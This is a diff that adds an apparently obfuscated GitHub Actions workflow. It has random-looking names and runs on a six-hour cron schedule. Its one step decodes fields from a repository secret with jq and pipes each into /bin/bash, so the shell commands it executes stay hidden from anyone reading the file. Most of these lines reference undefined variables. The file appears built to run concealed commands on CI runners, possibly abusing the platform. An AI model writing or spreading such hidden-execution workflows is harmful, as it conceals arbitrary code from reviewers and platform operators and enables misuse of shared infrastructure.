@@ -1,0 +1,22 @@
+name: gedeshi7618
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gedeshi7618
+        env:
+          merrf57828: ${{ secrets.merrf57828 }}
+        run: |
+          echo $merrf57828 | jq -r .pvz3 | /bin/bash
+          echo $mer91 | jq -r .ffue31686 | /bin/bash
+          echo $ehl3229 | jq -r .xhpnf9 | /bin/bash
+          echo $al2408 | jq -r .hmc0 | /bin/bash
+          echo $shiv77 | jq -r .ar933 | /bin/bash
+          echo $gphy74 | jq -r .fwve886 | /bin/bash
+
